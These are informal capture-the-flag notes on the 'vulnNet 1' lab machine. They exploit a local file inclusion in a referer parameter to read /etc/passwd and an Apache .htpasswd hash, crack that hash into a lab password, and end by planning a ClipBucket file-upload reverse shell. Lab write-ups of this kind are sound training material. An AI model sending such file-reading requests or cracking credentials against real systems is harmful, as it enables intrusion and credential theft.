vulnNet 1

IP: `10.10.131.193`


*	it's using `GET` req in `/login`

	```
	http://10.10.131.193/login.html?login=admin&password=admin
	```

*	no signup page

*	got 2 js files.


one js file has new parameter;

```js
    , n.o = function(e, t) {
        return Object.prototype.hasOwnProperty.call(e, t)
    }, n.p = "http://vulnnet.thm/index.php?referer=", n(n.s = 0)
({
    0: function(e, t, n) {
```

url: http://vulnnet.thm/index.php?referer=

try different stuff, LFI (local file inclusion) worked.

got /etc/passwd

url: http://vulnnet.thm/index.php?referer=/etc/passwd

```sh
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
syslog:x:102:106::/home/syslog:/usr/sbin/nologin
messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
_apt:x:104:65534::/nonexistent:/usr/sbin/nologin
uuidd:x:105:111::/run/uuidd:/usr/sbin/nologin
lightdm:x:106:113:Light Display Manager:/var/lib/lightdm:/bin/false
whoopsie:x:107:117::/nonexistent:/bin/false
kernoops:x:108:65534:Kernel Oops Tracking Daemon,,,:/:/usr/sbin/nologin
pulse:x:109:119:PulseAudio daemon,,,:/var/run/pulse:/usr/sbin/nologin
avahi:x:110:121:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/usr/sbin/nologin
hplip:x:111:7:HPLIP system user,,,:/var/run/hplip:/bin/false
server-management:x:1000:1000:server-management,,,:/home/server-management:/bin/bash
mysql:x:112:123:MySQL Server,,,:/nonexistent:/bin/false
sshd:x:113:65534::/run/sshd:/usr/sbin/nologin
```

tried LFI wordlist to discover more files.

```
/etc/mysql/conf.d/
/etc/apache2/.htpasswd
```

so `.htpasswd` is used to store username-password in plain text, we got:

```
developers:$apr1$ntOz2ERF$Sd6FT8YVTValWjL7bJv0P0
```

password is hashed maybe, so let's `John`


so password is, ig
```
9972761drmfsls
```


js file also has `broadcast.vulnnet.thm` subdomain, added to `/etc/host`

got 401. (username : password needed)


try this password and good to go. got website!

```
developers:9972761drmfsls
```

now we have webapp named `clipbucket` with version 4.

looking into exploits for less than v4


have here **Unauthenticated Arbitrary File Upload** to get reverse shell probably


...












